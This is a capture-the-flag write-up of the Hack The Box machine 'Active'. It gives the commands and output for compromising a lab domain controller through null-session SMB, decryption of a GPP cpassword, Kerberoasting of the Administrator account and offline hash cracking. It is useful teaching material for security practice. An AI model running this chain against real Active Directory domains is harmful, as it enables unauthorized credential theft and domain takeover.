---
title: "Hack The Box: Active"
date: 2025-11-14
summary: "An Easy Windows-based machine where the target is compromised by leveraging misconfigured SMB permissions, legacy Group Policy credentials, and Kerberoasting on a Domain Controller. An unauthenticated null session grants access to a replication share, exposing an encrypted GPP cpassword in Groups.xml. Decrypting it yields service account credentials, which are used to request a Kerberoastable TGS ticket for the Administrator account, ultimately cracking it for full control."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Active"
tags:
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - cpassword
  - credentials-in-public-shares
  - impacket-getuserspns
  - john
  - kerberoasting
  - netexec
  - nmap
  - smbclient
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.7.99
Nmap scan report for 10.129.7.99
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-13 22:28:19 +04 for 351s
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-13 14:33:02Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26474/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58465/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41441/udp): CLEAN (Timeout)
|   Check 4 (port 21642/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-11-13T14:34:01
|_  start_date: 2025-11-13T14:24:08
|_clock-skew: -3h59m56s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
<SNIP>
```

The pattern of running services indicate that the target is a Domain Controller (DC).

An interesting finding is that `winrm` isn’t open on the target.

### Enumerating SMB

Let’s start by enumerating SMB shares using `netexec` and guest account:

```bash
$ netexec smb 10.129.7.99 -u guest -p '' --shares
SMB         10.129.7.99     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.7.99     445    DC               [-] active.htb\guest: STATUS_ACCOUNT_DISABLED
```

Guest account is disabled. However, authenticating with the null account succeeded:

```bash
$ netexec smb 10.129.7.99 -u '' -p '' --shares
SMB         10.129.7.99     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.7.99     445    DC               [+] active.htb\: 
SMB         10.129.7.99     445    DC               [*] Enumerated shares
SMB         10.129.7.99     445    DC               Share           Permissions     Remark
SMB         10.129.7.99     445    DC               -----           -----------     ------
SMB         10.129.7.99     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.99     445    DC               C$                              Default share
SMB         10.129.7.99     445    DC               IPC$                            Remote IPC
SMB         10.129.7.99     445    DC               NETLOGON                        Logon server share 
SMB         10.129.7.99     445    DC               Replication     READ            
SMB         10.129.7.99     445    DC               SYSVOL                          Logon server share 
SMB         10.129.7.99     445    DC               Users                
```

Two non-default shares exist: Replication and Users.

Let’s also fill the `/etc/hosts` file with FQDNs using `netexec`:

```bash
$ netexec smb 10.129.7.99 -u '' -p '' --generate-hosts-file hosts
SMB         10.129.7.99     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.7.99     445    DC               [+] active.htb\: 

$ cat hosts | sudo tee -a /etc/hosts                
10.129.7.99     DC.active.htb active.htb DC
```

### Identifying and Cracking a Cpassword

We currently only have read access to Replication share, so let’s view its contents using `smbclient`.

```bash
$ smbclient -N //active.htb/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 14:37:44 2018
  ..                                  D        0  Sat Jul 21 14:37:44 2018
  active.htb                          D        0  Sat Jul 21 14:37:44 2018

                5217023 blocks of size 4096. 288085 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 14:37:44 2018
  ..                                  D        0  Sat Jul 21 14:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 14:37:44 2018
  Policies                            D        0  Sat Jul 21 14:37:44 2018
  scripts                             D        0  Wed Jul 18 22:48:57 2018
```

It seems that this is the root of a hierarchy of files, so let’s recursively download all of them:

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
<SNIP>
```

The hierarchy of files seems to be similar to a SYSVOL share:

```bash
$ tree -a .
.
└── active.htb
    ├── DfsrPrivate
    │   ├── ConflictAndDeleted
    │   ├── Deleted
    │   └── Installing
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── Group Policy
    │   │   │   └── GPE.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

23 directories, 7 files
```

However, a SYSVOL share already exists in the domain, as seen in the `netexec` output above. Why would be there two shares that contain SYSVOL data? Perhaps this share contains some additional data?

When enumerating the `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml` file, the following can be identified:

```bash
$ cat Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeI<REDACTED>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Interesting, a cpassword that can be decrypted!

Let’s decrypt the password using `gpp-decrypt`:

```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeI<REDACTED>

GPPsti<REDACTED>
```

Nice, now we have a set of credentials to enumerate the domain.

### Accessing Data of a Drive

Let’s start by checking if Svc_tgs user can access more shares:

```bash
$ netexec smb active.htb -u svc_tgs -p GPPsti<REDACTED> --shares
SMB         10.129.7.99     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.99     445    DC               [+] active.htb\svc_tgs:GPPsti<REDACTED>
SMB         10.129.7.99     445    DC               [*] Enumerated shares
SMB         10.129.7.99     445    DC               Share           Permissions     Remark
SMB         10.129.7.99     445    DC               -----           -----------     ------
SMB         10.129.7.99     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.99     445    DC               C$                              Default share
SMB         10.129.7.99     445    DC               IPC$                            Remote IPC
SMB         10.129.7.99     445    DC               NETLOGON        READ            Logon server share
SMB         10.129.7.99     445    DC               Replication     READ
SMB         10.129.7.99     445    DC               SYSVOL          READ            Logon server share
SMB         10.129.7.99     445    DC               Users           READ
```

Nice, this user can read the Users share.

Let’s do exactly that:

```bash
$ smbclient //active.htb/Users -U 'svc_tgs%GPPsti<REDACTED>'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 18:39:20 2018
  ..                                 DR        0  Sat Jul 21 18:39:20 2018
  Administrator                       D        0  Mon Jul 16 14:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 09:06:44 2009
  Default                           DHR        0  Tue Jul 14 10:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 09:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 08:57:55 2009
  Public                             DR        0  Tue Jul 14 08:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 19:16:32 2018
```

Once again, this seems to be a large hierarchy of files, and this time it seems to represent the `C:\Users\` directory on a Windows machine. Let’s download all of the files:

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
<SNIP>
```

Not all files were downloaded due to insufficient privileges. However, the `user.txt` found on the user’s desktop was downloaded:

```bash
$ tree -a .
.
├── Administrator
├── All Users
├── Default
<SNIP>
└── SVC_TGS
    ├── Contacts
    ├── Desktop
    │   └── user.txt
    ├── Downloads
    ├── Favorites
    ├── Links
    ├── My Documents
    ├── My Music
    ├── My Pictures
    ├── My Videos
    ├── Saved Games
    └── Searches

68 directories, 32 files
```

```bash
$ cat SVC_TGS/Desktop/user.txt
826154<REDACTED>
```

### Bloodhound

Let’s use `bloodhound` to map the domain objects and identify privilege escalation points.

First, let’s collect data for it using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d active.htb -u svc_tgs -p 'GPPsti<REDACTED>' -ns 10.129.7.99 -c all --zip       
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: active.htb
<SNIP>
INFO: Compressing output into 20251114230421_bloodhound.zip
```

After importing the data into `bloodhound` and checking the capabilities of Svc_tgs, it can be seen that the user doesn’t have any controls over other objects and isn’t part of interesting groups:

![Figure 1](/assets/images/writeups/hack-the-box-active/hack-the-box-active-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

### Kerberoasting the Admin

However, for some reason the Administrator is kerberoastable!

![Figure 2](/assets/images/writeups/hack-the-box-active/hack-the-box-active-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

Let’s grab the Administrator’s hash using `impacket-GetUserSPNs`:

```bash
$ impacket-GetUserSPNs active.htb/svc_tgs:GPPsti<REDACTED> -request-user Administrator

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

<SNIP>
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8d6922<REDACTED>
```

> **Note:** If you got an error related to time and skew, check out [this article](https://medium.com/@cider-htb/when-your-vm-lies-about-the-time-fixing-clock-skew-errors-within-ctfs-and-active-directory-5698b9493a37).

Nice. Now let’s try to crack it with `john`:

```bash
$ echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8d6922<REDACTED>' > admin.hash

$ john admin.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
Ticket<REDACTED> (?)
<SNIP>
```

Amazing, the hash was cracked successfully.

Since `winrm` isn’t enabled on the target, we can’t use `evil-winrm` to gain RCE.

However, we can enumerate the Users share (which we now know it represents the `C:\Users\` directory) using the administrator’s credentials and grab `root.txt`:

```bash
$ smbclient //active.htb/Users -U 'Administrator%Ticket<REDACTED>'
Try "help" to get a list of possible commands.
smb: \> cd Administrator
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 20:49:47 2021
  ..                                 DR        0  Thu Jan 21 20:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 17:50:10 2018
  root.txt                           AR       34  Fri Nov 14 20:29:05 2025

                5217023 blocks of size 4096. 245382 blocks available
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Administrator\Desktop\> exit

$ cat root.txt
df24c8<REDACTED>
```
